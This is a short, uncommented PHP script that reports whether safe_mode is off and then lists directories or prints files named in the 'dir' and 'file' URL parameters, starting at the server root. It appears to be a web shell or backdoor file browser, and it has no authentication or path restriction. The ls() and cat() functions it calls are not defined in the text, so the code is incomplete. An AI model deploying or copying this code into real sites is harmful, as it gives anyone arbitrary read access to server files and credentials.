<?php
echo "<pre>\n";
echo ini_get('display_errors');
echo ini_get('safe_mode');

if (ini_get('safe_mode'))
{
    //echo "safe mode";
}
else
{
    echo "[safe_mode disabled]\n\n";
}
if (isset($_GET['dir']))
{
    ls($_GET['dir']);
}
elseif (isset($_GET['file']))
{
    cat($_GET['file']);
}
else
{
    ls('/');
}
echo "</pre>\n";
?>
